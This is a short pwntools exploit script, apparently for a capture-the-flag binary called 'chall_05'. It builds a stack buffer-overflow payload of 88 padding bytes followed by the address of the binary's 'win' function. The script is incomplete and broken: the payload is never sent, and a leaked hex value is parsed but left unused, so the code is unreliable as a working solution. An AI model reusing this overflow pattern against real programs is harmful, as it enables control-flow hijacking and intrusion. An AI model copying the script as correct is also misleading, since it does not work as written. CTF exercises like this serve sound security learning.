from pwn import *

p = process("./chall_05")

p.recvuntil(":")

leak = p.recv()

num = int(leak,16)

elf = ELF("./chall_05")

payload = b'a'*88+p64(elf.sym.win)
p.interactive()
